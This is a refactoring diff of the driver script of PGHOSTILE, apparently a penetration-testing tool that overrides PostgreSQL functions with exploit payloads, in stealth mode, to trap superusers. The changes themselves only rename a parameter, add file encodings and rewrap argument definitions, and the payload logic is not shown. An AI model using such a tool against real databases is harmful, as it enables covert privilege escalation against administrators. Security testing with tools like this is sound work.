@@ -11,7 +11,7 @@ from core.database import Database
 from core.dbfunction_override import DBFunctionOverride
 
 
-def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests, out_dir, track_execution, overwrite_existing):
+def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests, out_dir, track_execution, overwrite):
     override_functions = []
     exploitables = []
     errors = []
@@ -29,7 +29,7 @@ def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests
             dff = DBFunctionOverride(df, artype, exploit_payload, stealth_mode, track_execution)
             if dff not in override_functions:
                 override_functions.append(dff)
-    if not overwrite_existing:
+    if not overwrite:
         print("[ * ] Checking if functions already exist")
         for df in override_functions:
             if df.exists():
@@ -53,11 +53,10 @@ def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests
                 test_log.append("-" * 64)
             except Exception as e:
                 test_log.append(f"Exception testing function {df} {e}")
-                pass
 
-        with open(os.path.join(out_dir, "exploitables.sql"), "w") as f:
+        with open(os.path.join(out_dir, "exploitables.sql"), "w", encoding="utf-8") as f:
             f.write("\n".join([f"{tq};" for tq in tested_queries]))
-        with open(os.path.join(out_dir, "exploitables_operator.sql"), "w") as f:
+        with open(os.path.join(out_dir, "exploitables_operator.sql"), "w", encoding="utf-8") as f:
             f.write("\n".join([f"{tq};" for tq in tested_queries_operator]))
 
         if len(exploitables) > 0:
@@ -85,7 +84,7 @@ def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests
                     errors.append(f"Exception creating exploit function {df} {e}")
 
         print("[ * ] Done!")
-        with open(os.path.join(out_dir, "drop_functions.sql"), "w") as f:
+        with open(os.path.join(out_dir, "drop_functions.sql"), "w", encoding="utf-8") as f:
             for fnc in created_functions:
                 if fnc.operator and fnc.operator.created:
                     f.write("%s;\n" % fnc.operator.drop_query)
@@ -96,10 +95,10 @@ def make_it_hostile(db, exploit_payload, stealth_mode, create_exploit, run_tests
 
     if len(errors) > 0:
         print_warn("There were some errors creating functions. See errors.txt for details")
-    with open(os.path.join(out_dir, "errors.txt"), "w") as f:
+    with open(os.path.join(out_dir, "errors.txt"), "w", encoding="utf-8") as f:
         f.write("\n".join(errors))
 
-    with open(os.path.join(out_dir, "test_log.txt"), "w") as f:
+    with open(os.path.join(out_dir, "test_log.txt"), "w", encoding="utf-8") as f:
         f.write("\n".join(test_log))
 
     print_ok(f"The '{out_dir}' folder contains the output")
@@ -109,7 +108,8 @@ def main():
     parser = argparse.ArgumentParser(description='PGHOSTILE. Make PostgreSQL an hostile environment for superusers')
     parser.add_argument('db_username', metavar='db_username', type=str, help='Database username')
     parser.add_argument('db_name', metavar='db_name', type=str, help='Database name')
-    parser.add_argument("-X", "--disable-exploits-creation", default=False, action='store_true', help='Do not create exploit functions')
+    parser.add_argument("-X", "--disable-exploits-creation", default=False, action='store_true',
+                        help='Do not create exploit functions')
     parser.add_argument("-H", '--db-host', default="127.0.0.1", type=str, help='Database host (default 127.0.0.1)')
     parser.add_argument("-p", '--db-port', default=5432, type=int, help='Database port')
     parser.add_argument("-P", "--ask-pass", action='store_true', help='Prompt for database passsword')
@@ -118,8 +118,10 @@ def main():
     parser.add_argument("-s", "--disable-stealth-mode", default=False, action='store_true', help='Disable stealth mode')
     parser.add_argument("-S", '--db-ssl-mode', type=str, help='Database ssl mode (default None)')
     parser.add_argument("-x", '--exploit-payload', type=str, help='The SQL commands')
-    parser.add_argument("-t", "--track-execution", default=False, action='store_true', help='Track the exploit function execution')
-    parser.add_argument("-O", "--no-overwrite", default=False, action='store_true', help='Stop execution if at least one exploit function already exists')
+    parser.add_argument("-t", "--track-execution", default=False, action='store_true',
+                        help='Track the exploit function execution')
+    parser.add_argument("-O", "--no-overwrite", default=False, action='store_true',
+                        help='Stop execution if at least one exploit function already exists')
     args = parser.parse_args()
 
     if not os.path.isdir(args.out):
@@ -170,7 +172,7 @@ def main():
             run_tests=not args.skip_tests,
             out_dir=args.out,
             track_execution=args.track_execution,
-            overwrite_existing=not args.no_overwrite
+            overwrite=not args.no_overwrite
         )
     except KeyboardInterrupt:
         print("Exit requested by the user")
